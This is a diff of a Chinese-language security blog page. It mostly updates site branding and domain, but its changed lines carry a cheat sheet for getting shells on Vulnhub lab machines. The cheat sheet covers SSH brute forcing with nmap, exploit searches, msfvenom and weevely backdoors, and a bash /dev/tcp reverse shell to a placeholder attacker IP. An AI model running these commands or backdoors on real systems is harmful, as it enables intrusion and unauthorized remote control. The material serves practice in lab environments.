@@ -14,7 +14,7 @@
     id="theme-color">
   <meta 
     name="description" 
-    content="C6ear.Blog">
+    content="c6ear.blog">
   <link 
     rel="icon" 
     href="/img/logo.png">
@@ -28,7 +28,7 @@
     
       <meta 
         property="og:url" 
-        content="https://cbeartalk.top/75811fbe.html">
+        content="https://chen-299.github.io/75811fbe.html">
     
     
       <meta 
@@ -52,7 +52,7 @@
         content="2022-07-21">
       <meta 
         property="og:article:author" 
-        content="C6ear">
+        content="C6EAR">
       
         
           <meta 
@@ -216,7 +216,7 @@
           src="/img/logo.png" 
           alt="blog logo">
       
-      <span class="navbar-logo-dsc">C6ear.Blog</span>
+      <span class="navbar-logo-dsc">c6ear.blog</span>
     </span>
   </div>
   <div class="navbar-menu">
@@ -354,18 +354,18 @@
     class="post-content">
     <h2 id="u83B7_u53D6shell"><a href="#u83B7_u53D6shell" class="headerlink" title="获取shell"></a>获取shell</h2><blockquote>
 <h3 id="1-_u7206_u7834"><a href="#1-_u7206_u7834" class="headerlink" title="1.爆破"></a>1.爆破</h3><blockquote>
-<p><strong>优先使用条件：</strong>获得有限的账户池与密码池<br><code>nmap -p 22 --script=ssh-brute --script-args userdb=&lt;账户池.txt&gt;,passdb=&lt;密码池.txt&gt; &lt;靶机ip&gt;</code><br><strong>使用实例：</strong><a target="_blank" rel="noopener" href="https://chen-299.github.io/6ceb590b.html">Vulnhub|Me and My Girlfriend</a></p>
+<p><strong>优先使用条件：</strong>获得有限的账户池与密码池<br><code>nmap -p 22 --script=ssh-brute --script-args userdb=&lt;账户池.txt&gt;,passdb=&lt;密码池.txt&gt; &lt;靶机ip&gt;</code><br><strong>使用实例：</strong><a href="https://chen-299.github.io/6ceb590b.html">Vulnhub|Me and My Girlfriend</a></p>
 </blockquote>
 <h3 id="2-_u5229_u7528exp"><a href="#2-_u5229_u7528exp" class="headerlink" title="2.利用exp"></a>2.利用exp</h3><blockquote>
-<p><strong>优先使用条件：</strong>获得使用内容的版本信息<br>（a）直接使用<strong>searchsploit</strong>  <code>searchsploit &lt;内容信息&gt;</code><br>（b）通过<strong>metasoploit</strong>  <code>search &lt;内容信息&gt;</code><br><strong>使用实例：</strong><a target="_blank" rel="noopener" href="https://chen-299.github.io/d4ec2f86.html">Vulnhub|SickOs1.2</a>  </p>
+<p><strong>优先使用条件：</strong>获得使用内容的版本信息<br>（a）直接使用<strong>searchsploit</strong>  <code>searchsploit &lt;内容信息&gt;</code><br>（b）通过<strong>metasoploit</strong>  <code>search &lt;内容信息&gt;</code><br><strong>使用实例：</strong><a href="https://chen-299.github.io/d4ec2f86.html">Vulnhub|SickOs1.2</a>  </p>
 </blockquote>
 <h3 id="3-_u53CD_u5F39shell"><a href="#3-_u53CD_u5F39shell" class="headerlink" title="3.反弹shell"></a>3.反弹shell</h3><blockquote>
-<p><strong>优先使用条件：</strong><br>3.1 有填入并生效php/jsp代码的交互<br><strong>msfvenom生成反弹shell代码+填入+metasploit监听</strong><br><strong>使用实例：</strong><a target="_blank" rel="noopener" href="https://chen-299.github.io/9c45f9e.html">Vulnhub|Os-Hax</a>  </p>
+<p><strong>优先使用条件：</strong><br>3.1 有填入并生效php/jsp代码的交互<br><strong>msfvenom生成反弹shell代码+填入+metasploit监听</strong><br><strong>使用实例：</strong><a href="https://chen-299.github.io/9c45f9e.html">Vulnhub|Os-Hax</a>  </p>
 <ul>
-<li>msfvenom生成反弹shell代码 <strong>详见<a target="_blank" rel="noopener" href="https://chen-299.github.io/2b3bf173.html">Tools-Msfvenom 反弹shell</a></strong>  </li>
+<li>msfvenom生成反弹shell代码 <strong>详见<a href="https://chen-299.github.io/2b3bf173.html">Tools-Msfvenom 反弹shell</a></strong>  </li>
 </ul>
-<p>3.2 能够PUT/上传代码<br>（a）<strong>msfvenom生成反弹shell代码+PUT/上传+metasploit监听</strong><br>（b）<strong>一句话木马+蚁剑+kail自带反弹shell代码(/usr/share/webshells/~)</strong><br><strong>使用实例：</strong><a target="_blank" rel="noopener" href="https://chen-299.github.io/d4ec2f86.html">Vulnhub|SickOs1.2</a><br>（c）<strong>weevely生成后门代码+PUT/上传+weevely连接后门</strong><br>生成后门 <code>weevely generate &lt;password&gt; &lt;path&gt;</code><br>连接后门 <code>weevely &lt;URL&gt; &lt;password&gt; [cmd]</code><br><strong>使用实例：</strong><a target="_blank" rel="noopener" href="https://chen-299.github.io/63d10771.html">Vulnhub|JIS-CTF-VulnUpload-CTF01</a>  </p>
-<p>3.3 有能够传入系统命令并执行的交互<br>传入反弹shell的系统口令 ： <code>bash -c &#39;bash -i &gt;&amp; /dev/tcp/&lt;攻击机ip&gt;/&lt;攻击机监听端口&gt; 0&gt;&amp;1&#39;</code><br>注意上述口令需要经过URL编码。<br><strong>使用实例：</strong><a target="_blank" rel="noopener" href="https://chen-299.github.io/d0179d0c.html">Vulnhub|DarkHole2</a>  </p>
+<p>3.2 能够PUT/上传代码<br>（a）<strong>msfvenom生成反弹shell代码+PUT/上传+metasploit监听</strong><br>（b）<strong>一句话木马+蚁剑+kail自带反弹shell代码(/usr/share/webshells/~)</strong><br><strong>使用实例：</strong><a href="https://chen-299.github.io/d4ec2f86.html">Vulnhub|SickOs1.2</a><br>（c）<strong>weevely生成后门代码+PUT/上传+weevely连接后门</strong><br>生成后门 <code>weevely generate &lt;password&gt; &lt;path&gt;</code><br>连接后门 <code>weevely &lt;URL&gt; &lt;password&gt; [cmd]</code><br><strong>使用实例：</strong><a href="https://chen-299.github.io/63d10771.html">Vulnhub|JIS-CTF-VulnUpload-CTF01</a>  </p>
+<p>3.3 有能够传入系统命令并执行的交互<br>传入反弹shell的系统口令 ： <code>bash -c &#39;bash -i &gt;&amp; /dev/tcp/&lt;攻击机ip&gt;/&lt;攻击机监听端口&gt; 0&gt;&amp;1&#39;</code><br>注意上述口令需要经过URL编码。<br><strong>使用实例：</strong><a href="https://chen-299.github.io/d0179d0c.html">Vulnhub|DarkHole2</a>  </p>
 </blockquote>
 </blockquote>
 <h2 id="u5347_u7EA7_u4EA4_u4E92_u5F0Fshell"><a href="#u5347_u7EA7_u4EA4_u4E92_u5F0Fshell" class="headerlink" title="升级交互式shell"></a>升级交互式shell</h2><blockquote>
@@ -393,15 +393,15 @@ python3 <span class="token operator">-</span>c <span class="token string">'impor
             target="_blank" 
             rel="nofollow noopener noreferrer" 
             href="/about">
-            C6ear
+            C6EAR
           </a>
         </p>
         <p>
           <span style="font-weight: bold;">文章链接：</span><a 
             target="_blank" 
             rel="nofollow noopener noreferrer" 
-            href="https://cbeartalk.top/75811fbe.html">
-            https://cbeartalk.top/75811fbe.html
+            href="https://chen-299.github.io/75811fbe.html">
+            https://chen-299.github.io/75811fbe.html
           </a>
         </p>
         <p><span style="font-weight: bold;">版权声明：</span><a target="_blank" rel="noopener">转载请注明出处！</a></p>
@@ -464,7 +464,7 @@ python3 <span class="token operator">-</span>c <span class="token string">'impor
     height="88"
     alt="author avatar">
 
-<p class="author-name">C6ear</p>
+<p class="author-name">C6EAR</p>
 <p class="author-description">Stay sharp, stay alone.</p>
 <div class="author-message">
   <a 
@@ -753,13 +753,13 @@ python3 <span class="token operator">-</span>c <span class="token string">'impor
         <span>
           Copyright ©
           
-          2023
+          2024
         </span>
         &nbsp;
         <a 
           href="/" 
           class="footer-link">
-          C6ear.Blog
+          c6ear.blog
         </a>
       </div>
     </div>
